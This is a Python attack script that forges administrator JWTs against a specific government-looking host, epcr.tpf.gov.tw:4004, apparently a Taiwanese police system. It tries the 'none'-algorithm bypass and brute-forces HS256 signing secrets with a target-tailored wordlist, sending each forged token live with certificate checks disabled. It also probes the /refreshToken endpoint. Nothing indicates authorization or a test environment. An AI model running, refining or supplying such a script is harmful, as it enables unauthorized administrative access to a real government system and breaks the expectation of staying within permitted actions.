import requests, json, urllib3, time, base64, hmac, hashlib
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=')

# 构造 payload (基于 AuthService: user, permissions, exp)
payload=json.dumps({"user":{"username":"admin","role":"ADMIN"},"permissions":["AUTH_ADMIN","AUTH_USER","AUTH_2FA"],"iat":1700000000,"exp":1999999999}).encode()
header=json.dumps({"alg":"HS256","typ":"JWT"}).encode()

# 1. none 算法攻击
print("=== 1. JWT none 算法攻击 ===")
none_header=json.dumps({"alg":"none","typ":"JWT"}).encode()
none_token=(b64u(none_header)+b'.'+b64u(payload)+b'.').decode()
print(f"  token: {none_token}")

# 2. HS256 弱密钥爆破 (业务相关)
print("\n=== 2. HS256 业务弱密钥爆破 ===")
secrets=["secret","password","jwt_secret","jwt","secret_key","auth_secret","AUTH_SECRET",
  "epcr","tpf","epcr_tpf","tpf_epcr","123456","admin","test","dev","production","localhost",
  "epcr.tpf.gov.tw","4004","AUTH_SERVER","AuthServer","authserver","jwtsecret","mysecret",
  "key","secret123","abcdef","qwert","password123","changeme","supersecret","hs256secret"]

hp=(b64u(header)+b'.'+b64u(payload))
for sec in secrets:
    sig=b64u(hmac.new(sec.encode(), hp, hashlib.sha256).digest())
    token=(hp+b'.'+sig).decode()
    s=requests.Session(); s.verify=False
    s.headers.update({"User-Agent":"Mozilla/5.0","Authorization":"Bearer "+token})
    try:
        r=s.get(BASE+"/", timeout=8)
        # 若 token 有效, 后端应返回非 401 (200/302)
        print(f"  [{sec:20s}] GET / -> {r.status_code}")
        if r.status_code not in (401,):
            print(f"    ** 可能有效! {r.text[:60]}")
    except Exception as e:
        print(f"  [{sec}] ERR {repr(e)[:30]}")
    time.sleep(0.05)

# 3. 测试 /refreshToken 端点 (API 端点, 响应 JSON)
print("\n=== 3. Bearer token 测试 /refreshToken (JSON 响应) ===")
s=requests.Session(); s.verify=False
s.headers.update({"User-Agent":"Mozilla/5.0","Authorization":"Bearer "+none_token})
r=s.get(BASE+"/refreshToken", timeout=8)
print(f"  none-alg GET /refreshToken -> {r.status_code} {r.text[:60]}")
print("DONE")
